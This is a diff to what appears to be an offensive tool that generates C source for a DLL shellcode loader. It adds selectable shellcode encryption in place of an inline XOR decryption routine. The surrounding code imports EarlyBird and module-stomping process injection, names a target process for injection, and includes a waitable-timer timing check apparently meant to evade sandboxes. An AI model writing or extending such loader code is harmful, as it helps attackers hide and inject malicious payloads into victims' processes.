@@ -1,7 +1,9 @@
 from Injection.EarlyBird_Injection import EarlyBird
 from Injection.Module_Stomping import ModuleStomping
+from Encryption.chosen_encryption import ChosenEncryption
+
 # here we specify the DLL skeleton 
-def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection):
+def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type):
     c_template = f"""
     #include <stdio.h>
     #include <stdlib.h>
@@ -23,18 +25,11 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
 
     BOOL executed = FALSE;
 
-    //xor decryption
-    void {xor_func}(unsigned char* data, size_t data_len, char* key, size_t key_len)
-    {{
-        int j;
-        j = 0;
-        for (int i = 0; i < data_len; i++)
-        {{
-            if (j == key_len - 1) j = 0;
-            data[i] = data[i] ^ key[j];
-            j++;
-        }}
-    }};
+    //decryption
+    
+    {
+            ChosenEncryption(encryption_type,xor_func)
+    }
 
     /*
     Timing attack using waitable timers. Test fails if any of the calls return an error state.
